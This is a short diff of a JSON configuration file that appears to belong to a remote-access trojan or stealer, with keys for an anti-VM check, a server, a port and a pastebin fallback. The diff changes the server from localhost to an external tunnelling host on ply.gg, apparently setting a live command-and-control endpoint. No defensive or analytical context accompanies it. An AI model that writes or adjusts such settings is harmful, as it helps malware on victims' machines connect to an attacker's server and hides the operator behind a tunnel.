@@ -2,8 +2,8 @@
   "debug": true,
   "antivm": false,
 
-  "server": "127.0.0.1",
-  "port": 6969,
+  "server": "production-inspections.gl.at.ply.gg",
+  "port": 18135,
 
   "pastebin": false,
   "pastebinlink": "",
